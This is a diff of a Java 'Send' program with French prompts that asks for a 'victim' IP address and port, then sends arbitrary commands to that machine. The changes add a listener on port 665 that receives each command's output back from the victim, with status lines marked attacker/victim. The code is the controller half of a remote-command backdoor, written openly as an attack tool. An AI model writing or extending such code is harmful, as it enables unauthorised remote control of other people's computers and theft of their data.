@@ -1,12 +1,11 @@
-import java.io.DataOutputStream;
-import java.io.IOException;
-import java.io.OutputStream;
+import java.io.*;
+import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.Scanner;
 
 public class Send {
 
-    public static void main(String[] args) {
+    public static void main(final String[] args) {
 
         final String ipAddress = getUserInput("L'addresse IP de la victime:");
         final int ipPort = Integer.parseInt(getUserInput("Numéro de port de la victime:"));
@@ -20,27 +19,50 @@ public class Send {
 
                 for (int i = 0; i < runCount; i++) {
 
-                    System.out.println("Connecting to '" + ipAddress + "' on port '" + ipPort + "'");
+                    System.out.println("\033[0;33m" + "[A <-?-> V]" + "\033[0m" + " Connexion à '" + ipAddress + "' sur le port '" + ipPort + "'");
                     final Socket socket = new Socket(ipAddress, ipPort);
-                    System.out.println("\033[0;32m" + "SUCCESS! CONNECTED SUCCESSFULLY!" + "\033[0m");
+                    System.out.println("\033[0;32m" + "[A <-v-> V]" + "\033[0m" + " SUCCÈS! CONNEXION RÉUSSI!");
+
+                    final Thread receiverThread = new Thread(() -> {
+                        try {
+                            final ServerSocket serverSocket = new ServerSocket(665);
+                            final Socket clientSocket = serverSocket.accept();
+                            final InputStream inputStream = clientSocket.getInputStream();
+                            final DataInputStream dataInputStream = new DataInputStream(inputStream);
+
+                            System.out.println(dataInputStream.readUTF());
+
+                            dataInputStream.close();
+                            inputStream.close();
+
+                            clientSocket.close();
+                            serverSocket.close();
+                        } catch (final IOException ignored) {}
+                    });
+
+                    receiverThread.start();
 
                     final OutputStream outputStream = socket.getOutputStream();
                     final DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
 
-                    System.out.println("Sending command '" + command + "'...");
+                    System.out.println("\033[0;33m" + "[A <-?-> V]" + "\033[0m" + " Envoi de la commande '" + command + "'...");
 
-                    // write the message we want to send
                     dataOutputStream.writeUTF(command);
-                    outputStream.flush();
                     dataOutputStream.flush();
+                    outputStream.flush();
                     dataOutputStream.close();
                     outputStream.close();
 
-                    System.out.println("\033[0;32m" + "SUCCESS! SENT COMMAND SUCCESSFULLY!" + "\033[0m");
+                    System.out.println("\033[0;32m" + "[A <-v-> V]" + "\033[0m" + " SUCCÈS! COMMANDE ENVOYÉ!" + "\033[0m");
                     socket.close();
+
+                    System.out.println("\033[0;33m" + "[A <-?-> V]" + "\033[0m" + " En attente des données ou erreurs de la commande...");
+                    receiverThread.join();
+
+                    Thread.sleep(50);
                 }
 
-            } catch (final IOException ignored) {}
+            } catch (final IOException | InterruptedException ignored) {}
         }
     }
 
